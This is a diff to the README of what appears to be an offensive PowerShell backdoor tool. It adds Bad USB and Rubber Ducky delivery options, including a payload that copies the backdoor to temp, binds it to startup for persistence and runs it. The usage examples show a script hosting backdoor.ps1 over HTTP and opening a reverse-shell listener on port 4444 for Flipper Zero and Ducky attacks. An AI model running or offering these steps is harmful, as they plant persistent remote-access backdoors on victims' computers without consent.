@@ -62,9 +62,15 @@ C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --verbose
 ```
 A file in the current working directory will be created called backdoor.ps1
 
+# Bad USB/ USB Rubber Ducky attacks
+When using any of these attacks you will be opening up a HTTP server hosting the backdoor. Once the backdoor is retrieved the HTTP server will be shutdown.
+
+## Payloads
+   * Execute -- Execute the backdoor 
+   * BindAndExecute -- Place the backdoor in temp, bind the backdoor to startup and then execute it.
 ## Flipper Zero Backdoor
 ```
-C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor.txt
+C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor.txt --payload execute
 [*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
 [*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
 ```
@@ -73,7 +79,7 @@ it will download and execute backdoor.ps1
 
 ## Usb Rubber Ducky Backdoor
 ```
- C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky
+ C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky --payload BindAndExecute
 [*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
 [*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
 ```
